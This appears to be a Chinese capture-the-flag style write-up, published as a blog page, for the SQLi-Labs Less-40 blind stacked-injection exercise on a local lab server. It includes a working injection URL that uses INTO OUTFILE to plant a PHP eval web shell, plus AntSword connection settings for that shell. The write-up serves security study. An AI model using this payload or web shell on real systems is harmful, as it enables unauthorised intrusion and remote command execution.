@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-40 盲堆叠注入与 WebShell Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-40 盲堆叠注入与 WebShell Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.28 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, 堆叠注入, 盲注, WebShell</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-40 (GET - Stacked Query Injection - Blind based - String)</li>
+        <li><strong>提示：</strong>基于括号的单引号闭合（<code>')</code>），支持堆叠执行，且无报错回显。</li>
+    </ul>
+
+    <h2>2. 核心原理与前置分析</h2>
+    <p>本关卡是 Less-39 的变种。后端依然使用 <code>mysqli_multi_query()</code> 支持堆叠注入，但上下文闭合方式变为 <code>id=('$id')</code>，且代码屏蔽了 <code>mysql_error()</code>，属于彻底的无回显盲环境。</p>
+    <p>在这种盲环境下，尝试用 <code>INSERT</code> 验证副作用意义不大（因为看不到回显），最高效的方式是直接利用 <code>INTO OUTFILE</code> 盲写 WebShell，并通过本地文件系统确认是否成功。</p>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：盲写 WebShell</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=1'); select '<?php @eval($_POST["cmd"]); ?>' into outfile 'D:/phpstudy_pro/WWW/sqli-labs-master/Less-40/shell.php'-- -</code></p>
+    <p><strong>解释：</strong>使用 <code>1')</code> 闭合原语句，追加分号执行 <code>INTO OUTFILE</code>。由于页面无报错且只回显默认数据，执行后页面上看不出任何变化，这属于“盲执行”。</p>
+
+    <p><strong>第二步：本地确认与蚁剑连接</strong></p>
+    <p>打开本地物理目录 <code>D:\phpstudy_pro\WWW\sqli-labs-master\Less-40\</code>，确认生成了 <code>shell.php</code>。</p>
+    <p>AntSword 的具体连接配置操作步骤与 Less-38 完全一致，此处不再重复赘述。修改以下参数：</p>
+    <ul>
+        <li><strong>URL 地址：</strong><code>http://localhost/sqli-labs-master/Less-40/shell.php</code></li>
+        <li><strong>连接密码：</strong><code>cmd</code></li>
+    </ul>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>盲执行的心态：</strong>在盲堆叠注入中，页面的平静不代表攻击失败。只要闭合符和 SQL 语法正确，恶意语句已经落地。必须跳出页面回显的依赖，去服务器底层（物理文件系统）寻找战果。</li>
+        <li><strong>闭合符的敏锐度：</strong>从 L38 的单引号、L39 的无引号，到本关的 <code>')</code>，闭合符的变化是决定注入能否成功的唯一钥匙。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>盲堆叠注入</strong>：在无回显环境下，直接利用堆叠漏洞执行高危操作（写马、插后门）。</li>
+        <li><strong>INTO OUTFILE 的实际应用</strong>：作为从 Web 权限提升到系统级权限（文件控制）的桥梁。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
